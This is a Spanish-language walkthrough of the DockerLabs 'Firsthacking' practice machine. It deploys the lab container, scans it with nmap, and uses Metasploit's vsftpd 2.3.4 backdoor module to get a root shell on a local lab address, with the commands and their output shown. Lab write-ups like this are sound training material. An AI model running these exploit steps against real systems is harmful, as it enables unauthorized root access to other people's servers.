---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Firsthacking DockerLabs (Very Easy)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip firsthacking.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh firsthacking.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-03 13:15 EST
Nmap scan report for 172.17.0.2
Host is up (0.000025s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.50 seconds
```

Vemos que solo tenemos un puerto abierto que es el `FTP` pero si intentamos entrar de forma anonima, veremos que no nos deja, probemos a buscar algun `exploit` asociado a la version del `FTP`.

## Exploit vsftpd 2.3.4

Si buscamos encontraremos un `exploit` asociado a el, la informacion esta en el siguiente link:

URL = [Exploit vsftpd 2.3.4](https://www.exploit-db.com/exploits/49757)

Vamos a entrar a `Metasploit` para ejecutar el `exploit` desde ese punto.

## Escalate Privileges

### Metasploit

```shell
msfconsole -q
```

Buscamos el `exploit`:

```shell
search vsftpd 2.3.4
```

Info:

```
Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor
```

Vemos que hay uno asociado a esa version, por lo que lo seleccionaremos de la siguiente forma:

```shell
use exploit/unix/ftp/vsftpd_234_backdoor
```

Y ahora lo tendremos que configurar poniendo lo siguiente:

```shell
set RHOSTS <IP_VICTIM>
exploit
```

Info:

```
[*] 172.17.0.2:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 172.17.0.2:21 - USER: 331 Please specify the password.
[+] 172.17.0.2:21 - Backdoor service has been spawned, handling...
[+] 172.17.0.2:21 - UID: uid=0(root) gid=0(root) groups=0(root)
[*] Found shell.
[*] Command shell session 1 opened (172.17.0.1:39909 -> 172.17.0.2:6200) at 2025-02-03 13:19:10 -0500

whoami
root
```

Y con esto veremos que ya seremos el usuario `root`, por lo que habremos terminado la maquina.
